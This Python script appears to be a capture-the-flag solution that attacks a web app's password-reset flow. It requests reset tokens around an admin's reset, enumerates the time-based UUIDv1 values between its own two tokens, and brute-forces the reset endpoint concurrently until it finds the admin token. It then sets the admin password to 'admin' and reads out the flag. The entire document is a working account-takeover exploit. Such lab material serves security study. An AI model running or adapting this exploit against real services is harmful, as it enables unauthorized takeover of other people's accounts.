import requests
import uuid
import httpx
import asyncio

HOST = "http://localhost:3000"

def get_cookies():
    response = requests.get(f"{HOST}/login")
    session_id = response.cookies['session_id']
    cookies = { "session_id": session_id }
    return cookies

def login(username, password):
    result = requests.post(f"{HOST}/login", json={ "username": username, "password": password }, cookies=cookies)
    if not result.json()['success']:
        print("Failed to login")
        exit(1)

# Calculate all the uuid v1 between token1 and token2
def get_uuids_between(token1, token2):
    # get first part of the token
    start = token1.split('-')[0]
    end = token2.split('-')[0]

    # Generate all the possible values by summing 10 from start until the end
    uuids = []
    while start != end:
        uuids.append(uuid.UUID(start + token1[len(start):]))
        start = hex(int(start, 16) + 16)[2:]
    return uuids

async def get_async(url, cookies=None):
    async with httpx.AsyncClient() as client:
        return await client.get(url, cookies=cookies)

async def find_admin_uuid(uuids):
    # Check the uuids in chunks of 1000 until the admin token is found
    chunk_size = 1000
    for i in range(0, len(uuids), chunk_size):
        chunk = uuids[i:i + chunk_size]
        funcs = [get_async(f"{HOST}/api/account/reset?token={uuid}", cookies=cookies) for uuid in chunk]
        responses = await asyncio.gather(*funcs)
        for resp in responses:
            if resp.status_code != 400 and "admin" in resp.text:
                # Get uuid from the request
                print("Reset token found")
                admin_token = f"{resp.url}".split('token=')[1]
                print(admin_token)
                return admin_token
    return False

# Create user
malicious_user = "anyone"
malicious_password = "anyone"
requests.put(f"{HOST}/login", json={ "username": malicious_user, "password": malicious_password })

# Get cookies
cookies = get_cookies()

# Perform the login
login(malicious_user, malicious_password)

# Generate the first reset link for the malicious user
requests.post(f"{HOST}/api/account/reset", json={ "name": malicious_user }, cookies=cookies).json()

# Generate a reset link for the admin user
requests.post(f"{HOST}/api/account/reset", json={ "name": "admin" }, cookies=cookies).json()

# Generate the second reset link for the malicious user
requests.post(f"{HOST}/api/account/reset", json={ "name": malicious_user }, cookies=cookies).json()

# Get the reset links from messages
result = requests.get(f"{HOST}/api/account/messages", cookies=cookies).json()
if not result['success']:
    print("Failed to get the messages")
    exit(1)

# Check if messages are at least 2
if len(result['messages']) < 2:
    print("Failed to get the messages")
    exit(1)

# Get the last 2 messages
message1 = result['messages'][-2]['message']
message2 = result['messages'][-1]['message']

# Extract the token from the messages (example: 'Reset your password <a href="/account/reset?token=d7d567a0-8a3d-11ef-9d4a-c1190a60d858">here</a>')
token1 = message1.split('token=')[1].split('">')[0]
token2 = message2.split('token=')[1].split('">')[0]
print(f"First UUID {token1}")
print(f"Second UUID {token2}")

# Generate all the uuids between the 2 tokens
uuids = get_uuids_between(token1, token2)
print(f"Trying {len(uuids)} uuids...")

# Find the admin token by trying all the uuids
admin_token = asyncio.run(find_admin_uuid(uuids))
if not admin_token:
    print("Failed to find the admin token")
    exit(1)

# Reset the admin password
result = requests.put(f"{HOST}/api/account/reset", json={ "token": admin_token, "password": "admin", "confirmPassword": "admin" }).json()
if not result['success']:
    print("Failed to reset the admin password")
    exit(1)

# Get new cookies
cookies = get_cookies()

# Perform the login with the new admin password
login("admin", "admin")

# Get all the users
result = requests.get(f"{HOST}/api/users", cookies=cookies).json()

# Print the user with name "flag"
for user in result['users']:
    if user['name'] == "flag":
        print(user['surname'])
